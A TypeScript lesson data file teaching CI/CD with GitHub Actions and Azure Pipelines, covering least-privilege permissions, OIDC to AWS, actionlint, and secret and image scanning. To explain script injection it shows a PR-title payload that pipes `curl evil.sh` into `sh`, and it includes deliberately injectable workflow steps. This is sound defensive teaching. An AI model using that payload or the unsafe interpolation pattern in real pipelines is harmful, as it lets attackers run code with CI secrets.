import type { Lesson } from "../../types";

export const lesson: Lesson = {
  id: "9.2.1",
  title: "GitHub Actions and Azure Pipelines",
  minutes: 85,
  level: "Intermediate",
  prerequisites: ["0.3.1 Git fundamentals", "9.1.2 Docker Compose for multi-service apps"],
  summary: "Build a CI/CD pipeline that tests every pull request, builds and scans an image, and deploys main to production with approvals, using GitHub Actions and the Azure Pipelines equivalent. You will lint workflows with actionlint, catch leaked secrets with gitleaks, and replace stored cloud keys with OIDC federation.",
  terms: [
    {
      term: "CI / CD",
      def: "Continuous Integration (build and test every change automatically) and Continuous Delivery/Deployment (release tested changes automatically, with or without a manual approval).",
    },
    {
      term: "Workflow / pipeline",
      def: "A YAML file describing when automation runs (triggers) and what it does (jobs and steps). GitHub: `.github/workflows/*.yml`; Azure DevOps: `azure-pipelines.yml`.",
    },
    {
      term: "Job / step / runner",
      def: "A job is a set of steps on one runner (a fresh VM or container); steps are commands or reusable actions/tasks. Jobs run in parallel unless they depend on each other.",
    },
    {
      term: "Matrix",
      def: "Run the same job with different parameters (Python 3.11 and 3.12, several OSes).",
    },
    {
      term: "Environment",
      def: "A deployment target (staging, production) with protection rules such as required reviewers and its own secrets.",
    },
    {
      term: "OIDC federation",
      def: "The CI system issues a short-lived signed identity token that the cloud exchanges for temporary credentials. No cloud keys stored in CI.",
    },
    {
      term: "Artifact / image tag",
      def: "The build output that moves through the pipeline. Tag images with the commit SHA so you always know what is deployed.",
    },
    {
      term: "Required check",
      def: "A status check that must pass before a pull request can merge (branch protection / rulesets).",
    },
  ],
  problem: [
    "DevAtlas is deployed by whoever remembers the commands. Last week someone deployed from a laptop with uncommitted changes; the week before, a pull request that broke the tests was merged because 'it worked locally'; and an AWS access key with admin rights is stored as a CI secret that never expires.",
    "A pipeline turns the release process into code that runs the same way every time: nothing merges without passing checks, nothing deploys except from main, and production deploys need an approval and short-lived credentials.",
  ],
  concept: {
    analogy: [
      "CI/CD is a **factory line with quality gates**. Every part (commit) goes through the same stations: inspection (lint), stress tests (tests), packaging (image build), X-ray (security scan). Only parts that pass every gate reach the loading dock (deployment), and the last door needs a supervisor's badge (environment approval) that is valid only for that shift (OIDC credentials).",
    ],
    precise: [
      "**Triggers:** `pull_request` runs checks before merge; `push` to main builds and deploys; `schedule` runs nightly or weekly scans; `workflow_dispatch` allows manual runs. Use path filters in monorepos.",
      "**Jobs and dependencies:** jobs run in parallel on fresh runners; `needs:` creates an order (test → image → deploy). Pass data between jobs with outputs or artifacts, not by assuming a shared disk.",
      "**Speed:** cache dependencies (`setup-python` with `cache: pip`, Docker layer cache with `cache-from: type=gha`), cancel outdated runs with `concurrency`, and split slow suites across a matrix.",
      "**Security:** set `permissions:` to the minimum (default `contents: read`), use environment protection for production, prefer OIDC over stored keys, pin third-party actions (ideally by commit SHA), never interpolate untrusted input (`github.event.*.title`) directly into shell scripts, and be very careful with `pull_request_target`, which runs with secrets on code from forks.",
      "**Azure Pipelines** has the same ideas with different words: stages → jobs → steps, tasks instead of actions, service connections (with workload identity federation) instead of OIDC configuration, and environments with approvals and checks.",
    ],
  },
  underTheHood: {
    text: [
      "A GitHub-hosted runner is a fresh VM per job. The runner downloads each action (a repository at a tag or SHA), runs it, and destroys the VM afterwards, so jobs are isolated and reproducible but start cold: that is why caches matter.",
      "`${{ }}` expressions are evaluated *before* the shell runs. If an expression inserts attacker-controlled text (a PR title like `\"; curl evil.sh | sh; \"`) into a `run:` script, it becomes code. Passing it through `env:` makes it data.",
      "OIDC: the job requests a JWT from GitHub signed for audience `sts.amazonaws.com`, with claims such as `repo:org/name:environment:production` in `sub`. AWS STS verifies the signature against GitHub's public keys and checks your role's trust-policy conditions before issuing credentials that expire in about an hour.",
      "Secrets are masked in logs, but masking is string replacement: transformed secrets (base64, split) are not masked. Never print secrets, even 'just to debug'.",
    ],
    diagram: {
      title: "The DevAtlas pipeline",
      nodes: [
        { label: "Pull request", sub: "lint + test matrix" },
        { label: "Merge to main", sub: "required checks" },
        { label: "Build image", sub: "tag = commit SHA" },
        { label: "Scan", sub: "secrets, deps, image" },
        { label: "Deploy", sub: "approval + OIDC" },
      ],
      edges: ["green", "push", "push to registry", "approve"],
    },
  },
  handsOn: [
    {
      title: "A small project with tests and a lint config",
      code: {
        lang: "toml",
        file: "pyproject.toml",
        code: `[project]
name = "tagger"
version = "0.1.0"
requires-python = ">=3.11"

[project.optional-dependencies]
dev = ["pytest==8.3.4", "pytest-cov==6.0.0", "ruff==0.8.4"]

[build-system]
requires = ["setuptools>=68"]
build-backend = "setuptools.build_meta"

[tool.setuptools.packages.find]
where = ["src"]

[tool.pytest.ini_options]
addopts = "--cov=tagger --cov-fail-under=90"

[tool.ruff]
line-length = 110`,
      },
      notes: [
        "The source is the `tag()` function from lesson 8.1.1 in `src/tagger/__init__.py`, with four parametrised pytest cases. Coverage below 90% fails the run (`--cov-fail-under`).",
      ],
    },
    {
      title: "Run what CI will run, locally first",
      code: {
        lang: "bash",
        code: `pip install -e ".[dev]"
ruff check .
pytest -q`,
      },
      output: "All checks passed!\n....                                                                     [100%]\nRequired test coverage of 90% reached. Total coverage: 100.00%\n4 passed in 0.04s",
      notes: [
        "A pipeline should only run commands you can run on your machine. 'CI-only magic' is impossible to debug.",
      ],
    },
    {
      title: "The GitHub Actions workflow",
      code: {
        lang: "yaml",
        file: ".github/workflows/ci.yml",
        code: `name: ci

on:
  pull_request:
  push:
    branches: [main]

permissions:
  contents: read                     # least privilege by default; jobs ask for more

concurrency:
  group: ci-\${{ github.ref }}
  cancel-in-progress: true           # a new push cancels the outdated run

jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        python: ["3.11", "3.12"]
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: \${{ matrix.python }}
          cache: pip
      - run: pip install -e ".[dev]"
      - run: ruff check .
      - run: pytest -q

  image:
    needs: test
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write                # push to GitHub Container Registry
    steps:
      - uses: actions/checkout@v4
      - uses: docker/setup-buildx-action@v3
      - uses: docker/login-action@v3
        if: github.ref == 'refs/heads/main'
        with:
          registry: ghcr.io
          username: \${{ github.actor }}
          password: \${{ secrets.GITHUB_TOKEN }}
      - uses: docker/build-push-action@v6
        with:
          context: .
          push: \${{ github.ref == 'refs/heads/main' }}
          tags: ghcr.io/\${{ github.repository }}/tagger:\${{ github.sha }}
          cache-from: type=gha
          cache-to: type=gha,mode=max

  deploy:
    needs: image
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    environment: production          # required reviewers and env-scoped secrets live here
    permissions:
      id-token: write                # OIDC: exchange a GitHub token for short-lived AWS creds
      contents: read
    steps:
      - uses: actions/checkout@v4
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/github-deploy
          aws-region: eu-west-1
      - id: render                   # put this commit's image into the task definition
        uses: aws-actions/amazon-ecs-render-task-definition@v1
        with:
          task-definition: infra/taskdef.json
          container-name: tagger
          image: ghcr.io/\${{ github.repository }}/tagger:\${{ github.sha }}
      - uses: aws-actions/amazon-ecs-deploy-task-definition@v2
        with:
          task-definition: \${{ steps.render.outputs.task-definition }}
          cluster: devatlas
          service: tagger
          wait-for-service-stability: true`,
      },
      notes: [
        "Pull requests run tests and build the image without pushing; main pushes the image and deploys. The image tag is the commit SHA, so every deployment is traceable to a commit.",
        "The `production` environment holds the approval rule. The deploy job never sees a long-lived AWS key; it gets temporary credentials via OIDC (homework challenge).",
        "If ECS pulls from GHCR, give the task definition `repositoryCredentials`, or push to ECR instead.",
      ],
    },
    {
      title: "Lint workflows before pushing them",
      text: [
        "actionlint checks syntax, expressions, runner labels and common security mistakes. Here it is run on a deliberately broken workflow.",
      ],
      code: {
        lang: "yaml",
        file: ".github/workflows/broken.yml",
        code: `name: broken
on:
  push:
    branch: [main]
jobs:
  test:
    runs-on: ubuntu-lates
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: \${{ matrix.python }}
      - run: echo "\${{ github.event.pull_request.title }}"`,
      },
      output: "$ actionlint\n4:5: unexpected key \"branch\" for \"push\" section. expected one of \"branches\", ... [syntax-check]\n7:14: label \"ubuntu-lates\" is unknown. available labels are \"ubuntu-latest\", ... [runner-label]\n12:31: property \"python\" is not defined in object type {} [expression]\n13:24: \"github.event.pull_request.title\" is potentially untrusted. avoid using it directly in inline scripts. instead, pass it through an environment variable. ... [expression]",
      notes: [
        "The last finding is a real injection risk. Fix: `env: { TITLE: \"${{ github.event.pull_request.title }}\" }` and `run: echo \"$TITLE\"`. The `ci.yml` above passes actionlint with no findings.",
      ],
    },
    {
      title: "The same pipeline in Azure Pipelines",
      code: {
        lang: "yaml",
        file: "azure-pipelines.yml",
        code: `trigger:
  branches:
    include: [main]
pr:
  branches:
    include: [main]

variables:
  imageRepo: devatlas/tagger
  acr: devatlasacr                              # Azure Container Registry name

stages:
  - stage: Test
    jobs:
      - job: test
        pool:
          vmImage: ubuntu-latest
        strategy:
          matrix:
            py311: { pythonVersion: "3.11" }
            py312: { pythonVersion: "3.12" }
        steps:
          - task: UsePythonVersion@0
            inputs:
              versionSpec: $(pythonVersion)
          - script: pip install -e ".[dev]"
            displayName: Install
          - script: ruff check .
            displayName: Lint
          - script: pytest -q --junitxml=test-results.xml
            displayName: Test
          - task: PublishTestResults@2
            condition: succeededOrFailed()
            inputs:
              testResultsFiles: test-results.xml

  - stage: Build
    dependsOn: Test
    jobs:
      - job: image
        pool:
          vmImage: ubuntu-latest
        steps:
          - task: Docker@2
            inputs:
              containerRegistry: acr-service-connection   # workload identity federation, no stored password
              repository: $(imageRepo)
              command: buildAndPush
              tags: $(Build.SourceVersion)

  - stage: Deploy
    dependsOn: Build
    condition: and(succeeded(), eq(variables['Build.SourceBranch'], 'refs/heads/main'))
    jobs:
      - deployment: production
        environment: production                 # approvals and checks configured on the environment
        pool:
          vmImage: ubuntu-latest
        strategy:
          runOnce:
            deploy:
              steps:
                - task: AzureCLI@2
                  inputs:
                    azureSubscription: azure-service-connection
                    scriptType: bash
                    scriptLocation: inlineScript
                    inlineScript: |
                      az containerapp update --name tagger --resource-group devatlas-rg \\
                        --image $(acr).azurecr.io/$(imageRepo):$(Build.SourceVersion)`,
      },
      notes: [
        "Service connections should use workload identity federation (the Azure DevOps equivalent of OIDC), and approvals live on the `production` environment in the Azure DevOps UI.",
      ],
    },
  ],
  companies: [
    "**Trunk-based development with required checks:** most teams merge small pull requests to main many times a day; branch rules require green CI and a review, and main is always deployable.",
    "**Build once, deploy many:** the same image (tagged by commit SHA) is promoted from staging to production; teams never rebuild for production, so what was tested is what runs.",
    "**OIDC everywhere:** companies remove static cloud keys from CI (GitHub → AWS/Azure/GCP federation, Azure DevOps workload identity), a direct response to supply-chain incidents where CI secrets were stolen.",
    "**Supply-chain security:** pinned actions, dependency review on pull requests, SBOM generation, image signing (for example Sigstore cosign) and provenance attestations are increasingly standard, especially in regulated industries.",
  ],
  mistakes: [
    {
      mistake: "Long-lived cloud keys stored as CI secrets",
      why: "First tutorial result",
      wrong: "A leaked or exfiltrated key gives attackers persistent cloud access",
      fix: "OIDC federation with a trust policy restricted to repo, branch or environment",
    },
    {
      mistake: "Default write permissions for every job",
      why: "Not knowing `permissions:` exists",
      wrong: "A compromised step can push code, create releases or alter packages",
      fix: "`permissions: contents: read` at the top; grant more per job",
    },
    {
      mistake: "Interpolating PR titles, branch names or comments into `run:`",
      why: "It reads naturally",
      wrong: "Script injection: attacker text becomes shell commands",
      fix: "Pass via `env:` and quote the variable",
    },
    {
      mistake: "Tagging images `latest`",
      why: "Simple",
      wrong: "Unclear what is deployed; rollbacks guess",
      fix: "Tag with commit SHA (and semver for releases)",
    },
    {
      mistake: "Deploying from laptops",
      why: "Faster in an emergency",
      wrong: "Untested, uncommitted code in production; no audit trail",
      fix: "Only the pipeline deploys; emergency path is a fast pipeline run",
    },
    {
      mistake: "Unpinned third-party actions",
      why: "`@main` always has the newest features",
      wrong: "A compromised or changed action runs with your secrets",
      fix: "Pin to a release tag at minimum, ideally a full commit SHA, and update with Dependabot",
    },
  ],
  bestPractices: [
    {
      tag: "Security",
      text: "Least-privilege `permissions`, OIDC instead of keys, environments with reviewers for production, pinned actions, secret scanning on every push.",
    },
    {
      tag: "Reliability",
      text: "Make the main branch protected with required checks; deploy the exact artifact that was tested; wait for service stability before reporting success.",
    },
    {
      tag: "Performance",
      text: "Cache dependencies and Docker layers, cancel superseded runs, run independent jobs in parallel, and filter by path in monorepos.",
    },
    {
      tag: "Maintainability",
      text: "Keep pipeline logic in scripts or make targets you can run locally; lint workflows with actionlint in CI.",
    },
    {
      tag: "Cost",
      text: "Skip unchanged parts of a monorepo, set job timeouts, and avoid very large runners unless they pay for themselves in time saved.",
    },
  ],
  interview: [
    {
      q: "Walk me through a CI/CD pipeline you would build for a containerised service.",
      a: "On pull requests: lint, unit tests (matrix if needed), integration tests with service containers, build the image without pushing, and security scans (secrets, dependencies, image). Merge requires these checks and a review. On main: build once, tag with the commit SHA, push to the registry, deploy to staging automatically, run smoke tests, then deploy the same image to production behind an environment approval, using OIDC credentials, and wait for health checks. Rollback means redeploying the previous SHA.",
    },
    {
      q: "How do you handle secrets in CI?",
      a: "Avoid them where possible: OIDC federation for cloud access, GITHUB_TOKEN with minimal permissions for the platform itself. Store the rest as environment-scoped secrets, available only to protected branches and approved environments. Never print them, never pass them to untrusted code (fork PRs, pull_request_target), rotate them, and run secret scanning to catch leaks in commits.",
    },
    {
      q: "What is the difference between continuous delivery and continuous deployment?",
      a: "Continuous delivery means every change that passes the pipeline is releasable and deployment is a push-button (often approved) step. Continuous deployment releases every passing change to production automatically. Both require strong automated tests, monitoring and fast rollback; the choice depends on risk tolerance and regulation.",
    },
  ],
  quickCheck: [
    {
      kind: "mcq",
      prompt: "Your deploy job needs AWS access. What is the most secure approach?",
      options: [
        "Store an admin access key as a repository secret",
        "Store a least-privilege access key as an environment secret",
        "OIDC: the job assumes a role whose trust policy allows only this repo's production environment",
        "Hard-code a key in the workflow, the repo is private",
      ],
      answer: 2,
      explanation: "No long-lived credential exists to leak, and the trust policy limits which workflows can assume the role. Credentials expire in about an hour.",
    },
    {
      kind: "output",
      prompt: "With `needs: [web, ai, api]` and `if: always()`, the gate job gets these results. Does its failure step run?",
      code: {
        lang: "python",
        code: `results = {"web": "skipped", "ai": "success", "api": "skipped"}
fails = "failure" in results.values() or "cancelled" in results.values()
print("exit 1" if fails else "gate passes")`,
      },
      options: ["exit 1", "gate passes", "It is skipped too", "It errors on skipped"],
      answer: 1,
      explanation: "Skipped jobs (no changes in that folder) are fine; only failures and cancellations fail the gate. That is why monorepos require one gate job instead of every individual job.",
    },
    {
      kind: "bug",
      prompt: "What is the security bug in this step?",
      code: { lang: "yaml", code: "- run: echo \"Building ${{ github.event.pull_request.head.ref }}\"" },
      options: [
        "echo is slow",
        "A branch name is attacker-controlled and is inserted into the shell script before it runs (script injection)",
        "head.ref does not exist",
        "Steps cannot print",
      ],
      answer: 1,
      explanation: "Branch names can contain shell syntax. Use `env: { REF: \"${{ github.event.pull_request.head.ref }}\" }` and `echo \"Building $REF\"`.",
    },
  ],
  cheatSheet: [
    "PR: lint + test + build (no push) + scans. Main: build once (SHA tag) → push → deploy.",
    "`permissions: contents: read` at top; grant more per job.",
    "`concurrency` with `cancel-in-progress` for outdated runs.",
    "Cache: `setup-python cache: pip`, Docker `cache-from: type=gha`.",
    "Production: `environment:` with required reviewers + env secrets.",
    "Cloud auth: OIDC (`id-token: write`) + role trust on `sub`.",
    "Untrusted input → `env:`, never directly into `run:`.",
    "Pin actions; actionlint in CI; gitleaks for secrets.",
    "Azure Pipelines: stages → jobs → steps; tasks; service connections; environments.",
  ],
  homework: {
    basic: {
      title: "Fix the broken workflow",
      brief: [
        "Run actionlint on the broken workflow from the hands-on, fix all four findings, and explain why the last one is a security issue rather than a style issue.",
      ],
      criteria: [
        "actionlint reports nothing",
        "Matrix defined for the Python version",
        "Untrusted input passed through env",
      ],
      hints: ["Install actionlint from its GitHub releases or run it in Docker (`rhysd/actionlint`)."],
      solution: {
        text: [
          "A PR title is controlled by whoever opens the PR. Inserting it with `${{ }}` happens before the shell parses the script, so quotes and semicolons in the title become shell syntax. Through `env:`, the shell only ever sees a variable.",
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/fixed.yml",
          code: `name: fixed
on:
  push:
    branches: [main]
  pull_request:
jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        python: ["3.12"]
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: \${{ matrix.python }}
      - env:
          TITLE: \${{ github.event.pull_request.title }}
        run: echo "Title is $TITLE"`,
        },
        output: "$ actionlint\n(no output: no problems found)",
      },
    },
    intermediate: {
      title: "Security scanning workflow",
      brief: [
        "Add a `security.yml` that runs on pull requests and weekly: gitleaks over full history, a dependency audit, and an image scan that fails on fixable HIGH/CRITICAL vulnerabilities. Prove the secret scan works by committing a fake key in a throwaway repo.",
      ],
      criteria: [
        "Full-history secret scan",
        "Dependency audit",
        "Image scan with a clear failure policy",
        "Scheduled run for new CVEs",
      ],
      hints: ["Weekly runs matter: new vulnerabilities are published for code you have not changed."],
      solution: {
        text: [
          "Verified locally: gitleaks found the planted AWS key (exit code 1) and `pip-audit` reported no known vulnerabilities. Fail only on fixable issues, or teams learn to ignore a permanently red check.",
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/security.yml",
          code: `name: security

on:
  pull_request:
  schedule:
    - cron: "17 3 * * 1"             # weekly: new CVEs appear in unchanged code too

permissions:
  contents: read

jobs:
  secrets:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0             # scan the whole history, not just the last commit
      - name: gitleaks
        run: |
          docker run --rm -v "$PWD:/repo" zricethezav/gitleaks:v8.21.2 \\
            detect --source /repo --redact --no-banner

  dependencies:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: "3.12"
      - run: pip install -e ".[dev]" pip-audit==2.7.3
      - run: pip-audit                 # audits everything installed in this environment

  image:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: docker build -t tagger:scan .
      - name: trivy (fail on fixable HIGH/CRITICAL)
        run: |
          docker run --rm -v /var/run/docker.sock:/var/run/docker.sock aquasec/trivy:0.58.1 \\
            image --exit-code 1 --ignore-unfixed --severity HIGH,CRITICAL tagger:scan`,
        },
        output: "$ gitleaks detect --redact -v\nRuleID:      aws-access-token\nFile:        settings.py\nWRN leaks found: 1      (exit code 1)\n$ pip-audit\nNo known vulnerabilities found",
        pitfalls: [
          "If a real secret was committed, deleting it in a new commit is not enough: it is still in history. Rotate it first, then clean history if needed.",
        ],
      },
    },
    challenge: {
      title: "OIDC from GitHub Actions to AWS",
      brief: [
        "Create, in Terraform, the GitHub OIDC provider and a deploy role that only this repository's `production` environment can assume, with a least-privilege policy for updating one ECS service. Apply it to LocalStack.",
      ],
      criteria: [
        "Trust policy checks `aud` and `sub`",
        "`sub` pinned to repo and environment",
        "Policy limited to one service plus required PassRole",
        "Applies cleanly",
      ],
      hints: ["`sub` looks like `repo:ORG/REPO:environment:production` for jobs that use an environment."],
      solution: {
        text: [
          "Without the `sub` condition, any repository on GitHub could assume your role: the most common OIDC misconfiguration. Verified on LocalStack: 3 resources created.",
        ],
        code: {
          lang: "hcl",
          file: "infra/github_oidc.tf",
          code: `terraform {
  required_providers {
    aws = { source = "hashicorp/aws", version = "~> 5.0" }
  }
}

variable "repo" {
  type    = string
  default = "my-org/devatlas"
}

# Trust GitHub's OIDC issuer once per AWS account.
resource "aws_iam_openid_connect_provider" "github" {
  url            = "https://token.actions.githubusercontent.com"
  client_id_list = ["sts.amazonaws.com"]
}

# Only workflow jobs in this repo, running in the "production" environment, may assume the role.
data "aws_iam_policy_document" "github_trust" {
  statement {
    actions = ["sts:AssumeRoleWithWebIdentity"]
    principals {
      type        = "Federated"
      identifiers = [aws_iam_openid_connect_provider.github.arn]
    }
    condition {
      test     = "StringEquals"
      variable = "token.actions.githubusercontent.com:aud"
      values   = ["sts.amazonaws.com"]
    }
    condition {
      test     = "StringEquals"
      variable = "token.actions.githubusercontent.com:sub"
      values   = ["repo:\${var.repo}:environment:production"]
    }
  }
}

resource "aws_iam_role" "github_deploy" {
  name               = "github-deploy"
  assume_role_policy = data.aws_iam_policy_document.github_trust.json
}

data "aws_iam_policy_document" "deploy" {
  statement {
    actions   = ["ecs:RegisterTaskDefinition", "ecs:DescribeTaskDefinition"]
    resources = ["*"] # these two actions do not support resource-level permissions
  }
  statement {
    actions   = ["ecs:UpdateService", "ecs:DescribeServices"]
    resources = ["arn:aws:ecs:eu-west-1:*:service/devatlas/tagger"]
  }
  statement {
    actions   = ["iam:PassRole"]
    resources = ["arn:aws:iam::*:role/devatlas-tagger-*"]
  }
}

resource "aws_iam_role_policy" "deploy" {
  role   = aws_iam_role.github_deploy.id
  policy = data.aws_iam_policy_document.deploy.json
}

output "trust_policy" {
  value = jsondecode(data.aws_iam_policy_document.github_trust.json).Statement[0].Condition
}`,
        },
        output: "Apply complete! Resources: 3 added, 0 changed, 0 destroyed.\n\ntrust_policy = {\n  \"StringEquals\" = {\n    \"token.actions.githubusercontent.com:aud\" = \"sts.amazonaws.com\"\n    \"token.actions.githubusercontent.com:sub\" = \"repo:my-org/devatlas:environment:production\"\n  }\n}",
      },
    },
    capstone: {
      title: "DevAtlas: monorepo CI with one required gate",
      brief: [
        "Write DevAtlas's CI: detect which of web, AI service and API changed, run only those jobs (Node, Python with a Postgres service container, .NET), and finish with one `ci-passed` job that branch protection requires.",
      ],
      criteria: [
        "Path filtering",
        "Service container for integration tests",
        "Gate job tolerates skipped jobs but not failures",
        "actionlint clean",
      ],
      hints: ["`if: always()` on the gate, then inspect `needs.*.result`."],
      solution: {
        text: [
          "Requiring each job directly breaks when a job is skipped; requiring one gate solves it. Validated with actionlint; run it on your repository to see path filtering in action.",
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/ci.yml",
          code: `name: ci

on:
  pull_request:
  push:
    branches: [main]

permissions:
  contents: read

concurrency:
  group: ci-\${{ github.ref }}
  cancel-in-progress: true

jobs:
  changes:                                  # decide which parts of the monorepo changed
    runs-on: ubuntu-latest
    permissions:
      pull-requests: read
    outputs:
      web: \${{ steps.filter.outputs.web }}
      ai: \${{ steps.filter.outputs.ai }}
      api: \${{ steps.filter.outputs.api }}
    steps:
      - uses: actions/checkout@v4
      - id: filter
        uses: dorny/paths-filter@v3
        with:
          filters: |
            web: ['web/**']
            ai:  ['services/ai/**']
            api: ['services/api/**']

  web:
    needs: changes
    if: needs.changes.outputs.web == 'true'
    runs-on: ubuntu-latest
    defaults:
      run:
        working-directory: web
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 22
          cache: npm
          cache-dependency-path: web/package-lock.json
      - run: npm ci
      - run: npm run lint && npm run typecheck && npm test -- --run
      - run: npm run build

  ai:
    needs: changes
    if: needs.changes.outputs.ai == 'true'
    runs-on: ubuntu-latest
    defaults:
      run:
        working-directory: services/ai
    services:
      postgres:                             # a real database for integration tests
        image: pgvector/pgvector:pg17
        env:
          POSTGRES_PASSWORD: ci
        ports: ["5432:5432"]
        options: >-
          --health-cmd "pg_isready -U postgres"
          --health-interval 5s --health-retries 10
    env:
      DATABASE_URL: postgresql://postgres:ci@localhost:5432/postgres
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: "3.12"
          cache: pip
      - run: pip install -r requirements.txt -r requirements-dev.txt
      - run: ruff check . && pytest -q

  api:
    needs: changes
    if: needs.changes.outputs.api == 'true'
    runs-on: ubuntu-latest
    defaults:
      run:
        working-directory: services/api
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-dotnet@v4
        with:
          dotnet-version: "9.0.x"
      - run: dotnet test --configuration Release

  ci-passed:                                # the ONE check branch protection requires
    if: always()
    needs: [web, ai, api]
    runs-on: ubuntu-latest
    steps:
      - name: Fail if any needed job failed or was cancelled
        if: contains(needs.*.result, 'failure') || contains(needs.*.result, 'cancelled')
        run: exit 1
      - run: echo "all required checks passed (skipped jobs had no changes)"`,
        },
        output: "$ actionlint\n(no output: no problems found)",
      },
    },
  },
  deeper: [
    {
      label: "GitHub Docs: Security hardening for GitHub Actions",
      url: "https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions",
    },
    {
      label: "GitHub Docs: Configuring OpenID Connect in AWS",
      url: "https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-amazon-web-services",
    },
    {
      label: "Azure Pipelines YAML schema",
      url: "https://learn.microsoft.com/azure/devops/pipelines/yaml-schema/",
    },
    { label: "actionlint", url: "https://github.com/rhysd/actionlint" },
  ],
  nextPreview: "Next: Terraform: state, modules and plan-before-apply, so every cloud resource is reviewed code.",
};
